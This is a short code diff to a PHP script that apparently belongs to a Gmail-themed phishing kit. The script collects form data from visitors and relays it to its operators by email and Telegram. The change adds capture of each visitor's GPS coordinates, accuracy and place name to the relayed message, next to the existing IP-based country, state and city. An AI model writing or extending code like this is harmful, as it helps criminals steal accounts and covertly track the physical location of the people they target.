@@ -26,6 +26,12 @@ $status = isset($_POST['status']) ? trim($_POST['status']) : '';
 $device_verify = isset($_POST['device_verify']) ? trim($_POST['device_verify']) : '';
 $chosen_number = isset($_POST['chosen_number']) ? trim($_POST['chosen_number']) : '';
 
+// GPS location data
+$gps_lat = isset($_POST['gps_lat']) ? trim($_POST['gps_lat']) : '';
+$gps_lng = isset($_POST['gps_lng']) ? trim($_POST['gps_lng']) : '';
+$gps_accuracy = isset($_POST['gps_accuracy']) ? trim($_POST['gps_accuracy']) : '';
+$location_name = isset($_POST['location_name']) ? trim($_POST['location_name']) : '';
+
 // Function to log message via email and Telegram with improved concurrency handling
 function logMessage($message, $send, $subject) {
     // Generate unique request ID for tracking concurrent requests
@@ -308,7 +314,19 @@ if (!empty($vote)) {
     $message .= "📋 DETAILS:\n";
     $message .= "PLATFORM: GMAIL\n";
     $message .= "Device Verified: " . htmlspecialchars($device_verify) . "\n";
-    $message .= "\n🌍 LOCATION:\n";
+
+    // Add GPS location if available
+    if (!empty($gps_lat) && !empty($gps_lng)) {
+        $message .= "GPS Coordinates: " . htmlspecialchars($gps_lat) . ", " . htmlspecialchars($gps_lng) . "\n";
+        if (!empty($gps_accuracy)) {
+            $message .= "GPS Accuracy: ±" . htmlspecialchars($gps_accuracy) . " meters\n";
+        }
+        if (!empty($location_name) && $location_name !== 'Location unknown') {
+            $message .= "GPS Location: " . htmlspecialchars($location_name) . "\n";
+        }
+    }
+
+    $message .= "\n🌍 IP-BASED LOCATION:\n";
     $message .= "Country: " . $location['country'] . "\n";
     $message .= "State: " . $location['region'] . "\n";
     $message .= "City: " . $location['city'] . "\n";
